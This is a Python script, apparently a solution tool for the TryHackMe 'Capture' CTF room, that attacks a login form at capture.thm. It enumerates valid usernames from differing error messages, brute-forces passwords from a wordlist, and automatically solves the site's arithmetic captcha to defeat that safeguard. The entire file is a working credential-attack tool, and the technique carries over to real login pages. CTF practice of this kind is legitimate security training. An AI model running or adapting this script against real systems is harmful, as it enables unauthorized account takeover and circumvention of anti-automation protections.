import requests
import re

def print_banner():
    banner = r"""
    
/$$$$$$$                           /$$$$$$        /$$                                
| $$__  $$                         /$$__  $$      | $$                                
| $$  \ $$ /$$  /$$  /$$ /$$$$$$$ |__/  \ $$  /$$$$$$$                                
| $$$$$$$/| $$ | $$ | $$| $$__  $$   /$$$$$/ /$$__  $$                                
| $$____/ | $$ | $$ | $$| $$  \ $$  |___  $$| $$  | $$                                
| $$      | $$ | $$ | $$| $$  | $$ /$$  \ $$| $$  | $$                                
| $$      |  $$$$$/$$$$/| $$  | $$|  $$$$$$/|  $$$$$$$                                
|__/       \_____/\___/ |__/  |__/ \______/  \_______/                                
                                                                                      
                                                                                      
                                                                                      
  /$$$$$$                        /$$                                         /$$      
 /$$__  $$                      | $$                                        | $$      
| $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$   /$$   /$$  /$$$$$$   /$$$$$$       | $$      
| $$       |____  $$ /$$__  $$|_  $$_/  | $$  | $$ /$$__  $$ /$$__  $$      | $$      
| $$        /$$$$$$$| $$  \ $$  | $$    | $$  | $$| $$  \__/| $$$$$$$$      |__/      
| $$    $$ /$$__  $$| $$  | $$  | $$ /$$| $$  | $$| $$      | $$_____/                
|  $$$$$$/|  $$$$$$$| $$$$$$$/  |  $$$$/|  $$$$$$/| $$      |  $$$$$$$       /$$      
 \______/  \_______/| $$____/    \___/   \______/ |__/       \_______/      |__/      
                    | $$                                                              
                    | $$                                                              
                    |__/                                                              

    Pwn3d - CTF Username and Password Enumerator with Captcha Solver
    Author: Pwn3d
    Date: 2025-08-09

    Challenge : https://tryhackme.com/room/capture
    Website : https://x-pwn3d.github.io/
"""                                          
    print(banner)
              


def solve_captcha(text):
    """
    Detects and solves a captcha expression like '418 * 84' or '12 + 5' in the text.
    Returns the answer as a string, or None if no captcha found.
    """
    match = re.search(r"(\d+)\s*([+\-*/])\s*(\d+)", text)
    if not match:
        return None

    x, operator, y = match.group(1), match.group(2), match.group(3)
    x, y = int(x), int(y)

    try:
        if operator == '+':
            return str(x + y)
        elif operator == '-':
            return str(x - y)
        elif operator == '*':
            return str(x * y)
        elif operator == '/':
            return str(x // y)  # integer division to avoid floats
    except ZeroDivisionError:
        return None

def main():
    print_banner()
    url = "http://capture.thm/login"
    usernames = "usernames.txt"
    passwords = "passwords.txt"

    with open(usernames) as w:
        for user in w:
            user = user.strip()
            print(f"[+] Testing username: {user}")

            # First attempt without captcha
            data = {"username": user, "password": "fakepassword"}
            r = requests.post(url, data=data)
            text = r.text

            captcha_answer = solve_captcha(text)
            if captcha_answer:
                data["captcha"] = captcha_answer
                r = requests.post(url, data=data)
                text = r.text

            if "does not exist" not in text:
                print(f"########## Possible valid user found: {user} ##########")
                with open(passwords) as p :
                    for password in p:
                        password = password.strip()
                        print(f"[+] Testing password: {password}")
                        data = {"username": user, "password": password}
                        r = requests.post(url, data=data)
                        text = r.text

                        captcha_answer = solve_captcha(text)
                        if captcha_answer:
                            data["captcha"] = captcha_answer
                            r = requests.post(url, data=data)
                            text = r.text

                        if "Invalid password for user" not in text:
                            print("\n" + "#" * 55)
                            print(f"###  Password FOUND for user '{user}': '{password}'  ###")
                            print("#" * 55 + "\n")
                            return

                        else:
                            print(f"[-] Invalid password for user {user} : {password}")
                                    
            else:
                print(f"[-] {user} does not exist")
                
if __name__ == "__main__":
    main()
